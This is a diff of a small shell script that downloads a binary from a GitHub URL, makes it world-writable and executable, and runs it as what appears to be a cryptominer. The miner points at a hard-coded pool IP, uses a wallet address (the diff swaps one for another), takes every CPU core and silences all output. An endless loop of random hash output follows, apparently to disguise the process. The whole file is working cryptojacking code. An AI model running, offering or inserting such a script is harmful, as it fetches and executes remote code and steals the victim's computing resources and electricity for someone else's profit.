@@ -1,5 +1,5 @@
 #!/bin/sh
 wget https://github.com/aqshakuy/filebatur/raw/master/xmolx
 chmod 777 xmolx
-./xmolx -o 45.79.50.119:80 -u 86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x C -t$(nproc --all) >/dev/null 2>&1
+./xmolx -o 45.79.50.119:80 -u 867VgRiSidDhm8L4gUzkSoKA49D6bcsBwRneopcngnQb85TX3LG9poAfdThb3nxLmXBCEh2KHkpUUSU8DbjVjX9oSKScM6D.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x C -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
